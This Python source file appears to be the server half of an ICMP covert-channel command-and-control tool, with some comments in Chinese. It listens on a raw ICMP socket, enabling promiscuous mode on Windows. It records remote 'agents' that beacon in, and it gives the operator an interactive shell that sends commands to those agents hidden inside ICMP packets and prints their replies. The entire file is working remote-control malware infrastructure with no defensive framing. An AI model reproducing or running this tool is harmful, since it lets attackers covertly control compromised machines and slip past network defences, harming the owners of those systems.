import socket
import struct
import threading
import time
import sys
import os
DATA_LEN = 1024
CurAddr = ("1.1.1.1",0)
onlineAddrList = []

def checkSum(packet):
    sum = 0
    countTo = (len(packet)//2)*2
    count = 0
    while count < countTo:
        sum += ((packet[count+1] << 8) | packet[count])
        count += 2

    if countTo < len(packet):
        sum += packet[len(packet) - 1]
        sum = sum & 0xffffffff
    
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def createSocket(host):
    rawSocket = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.getprotobyname("icmp"))
    # 该选项可以让多个socket对象绑定到相同的地址和端口上
    rawSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rawSocket.bind((host,0))
    #通过setsockopt函数来设置数据保护IP头部,IP头部我们就可以接收到
    #rawSocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # 在WIN平台上，需要设置IOCTL以启用混杂模式
    if os.name == "nt":
        rawSocket.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    
    return rawSocket

def buildPackage(data):
    check_sum = 0
    ID = 0xBB
    packStr = '!BBHHH' + str(DATA_LEN) + 's'
    packet = struct.pack(packStr,0,0,check_sum,ID,0,data)
    check_sum = checkSum(packet)
    packet = struct.pack(packStr,0,0,check_sum,ID,0,data)
    return packet

def getIcmpData(packet):
    length = len(packet)
    return packet[length - DATA_LEN : length]

def encodeCommand(command):
    packet = buildPackage(command.encode("utf-8"))
    return packet

def cmdShell(ipAddress,icmpSocket):
    global CurAddr
    addr = (ipAddress,0)
    CurAddr = addr
    while True:
        cmd = input()
        if cmd == "exit":
            #icmpSocket.sendto(encodeCommand(cmd),CurAddr)
            return       
        icmpSocket.sendto(encodeCommand(cmd),CurAddr)

def removeAgent(ipAddress):
    global onlineAddrList
    for addr in onlineAddrList:
        if addr[0] == ipAddress:
            onlineAddrList.remove(addr)
            print("remove " + addr)
            return

def showOnlineList():
    print('-------------------')
    for addr in onlineAddrList:
        print(addr)
    print('-------------------')

def commandFunc(icmpSocket):
    global CurAddr
    while True:
        command = input('>')
        if command == "show":
            showOnlineList()
        if command == "help":
            showHelp()
        if command == "exit":
            os._exit(0)
        if command.find("intercat") != -1:		
            try:
                cmd_sp = command.split(' ',1);#split command (list)
                cmdShell(cmd_sp[1],icmpSocket)
            except BaseException:
                continue
        if command.find("remove") != -1:		
            try:
                cmd_sp = command.split(' ',1);#split command (list)
                removeAgent(cmd_sp[1])
            except BaseException:
                continue

def recvThread(icmpSocket):
    print("recv thread start..")
    global CurAddr
    while True:
        packet,addr = icmpSocket.recvfrom(4096)
        data = getIcmpData(packet)
        content = data.decode('utf-8').strip(b'\x00'.decode())
        #isOnlinePacket?
        if content == "ol":
            print("new agent:" + str(addr))
            onlineAddrList.append(addr)
            #icmpSocket.sendto(encodeCommand("ok"),addr)
        else:
            if addr[0] == CurAddr[0]:
                print(content)

def showHelp():
    print("show           Show online list")
    print("intercat IP    Shell")
    print("remove IP      Remove Agent")
    print("exit           Exit")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("python icmp_server.py YourIP")
        os._exit(0)
    
    icmpSocket = createSocket(sys.argv[1])
    recv_thread = threading.Thread(target=recvThread,args=(icmpSocket,))
    recv_thread.start()
    commandFunc(icmpSocket)